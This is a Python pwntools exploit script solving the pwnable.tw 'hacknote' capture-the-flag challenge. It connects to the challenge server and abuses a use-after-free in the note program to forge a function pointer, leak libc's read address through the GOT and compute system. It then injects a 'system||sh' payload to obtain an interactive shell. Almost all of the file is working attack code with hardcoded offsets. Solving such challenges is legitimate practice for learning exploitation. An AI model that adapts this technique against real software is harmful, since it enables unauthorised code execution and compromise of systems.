#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
HHui NOTE: this is a UAF vulnerability.
required Knowledge: malloc allocation size, fastin's LIFO, UAF
'''

from pwn import *
#from ctypes import *
local = 0
debug = 0
elf = ELF('/ext4-1TB-data/Experiments/ctf-exercise/pwnables/pwnable.tw/hacknote-200pts/hacknote')
context.update(arch = 'amd64')


if local:
	p = process('/ext4-1TB-data/Experiments/ctf-exercise/pwnables/pwnable.tw/hacknote-200pts/hacknote')
	#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc = ELF('/ext4-1TB-data/Experiments/ctf-exercise/pwnables/pwnable.tw/hacknote-200pts/libc-2.19.so') # libc32 on my own system.
	context.log_level = 'debug'

	if debug:
		gdb.attach(p)

	read_offset   = 0xdd3e0
	system_offset = 0x40310    
else:
	p = remote('chall.pwnable.tw', 10102)
	libc = ELF('/ext4-1TB-data/Experiments/ctf-exercise/pwnables/pwnable.tw/hacknote-200pts/libc_32.so.6')
	read_offset   = 0xd41c0
	system_offset = 0x3a940


def option1_addNote(noteSz, noteContent):
	p.send("1")
	p.recvuntil("Note size :")
	p.send(noteSz)
	p.recvuntil("Content :")
	noteContent = noteContent.ljust( int(noteSz), 'A' )
	p.send(noteContent)



def option2_delNote(noteIndex):
	p.send("2")
	p.recvuntil("Index :")
	p.send(noteIndex)



def option3_printNote(noteIndex):
	p.send("3")
	p.recvuntil("Index :")
	p.send(noteIndex)


## 1st step: leak libc's address
# --------------------------------------------------------------- #
p.recvuntil('Your choice :')    
option1_addNote("12", 12 * "A") # note 0


p.recvuntil('Your choice :')
option1_addNote("32", 32 * "B") # note 1


p.recvuntil('Your choice :')
option2_delNote("0")

p.recvuntil('Your choice :')
option2_delNote("1")

print "GOT[read] = " + hex(elf.got['read'])
read_got = p32(elf.got['read'])
payload  = p32(0x0804862b) # the print function 
payload  = payload + read_got
p.recvuntil('Your choice :')
option1_addNote("12", payload) # note 2

## leak READ so as to get libc's address utilizing the dangling ptr
p.recvuntil('Your choice :')
option3_printNote("0")
read_addr = p.recv(4)
print "read_addr" + str(u32(read_addr))

libc_base_addr = u32(read_addr) - read_offset
# --------------------------------------------------------------- #

#system = read_addr +libc.systels['read']-libc.sysbols['ssystem']



# 2nd step: forge the shell
# --------------------------------------------------------------- #
p.recvuntil('Your choice :')
option2_delNote("2")

system_addr = libc_base_addr + system_offset
'''
binsh_addr  = libc_base_addr + next(libc.search('/bin/sh'))
payload 	= p32(system_addr) + p32(binsh_addr)
print "binsh: "
print hex(binsh_addr)

'''
payload = p32(system_addr) + "||sh" + p32(0)


#raw_input()

p.recvuntil('Your choice :')
option1_addNote("12", payload)

#raw_input()

p.recvuntil('Your choice :')
option3_printNote("0")
# --------------------------------------------------------------- #

p.interactive()
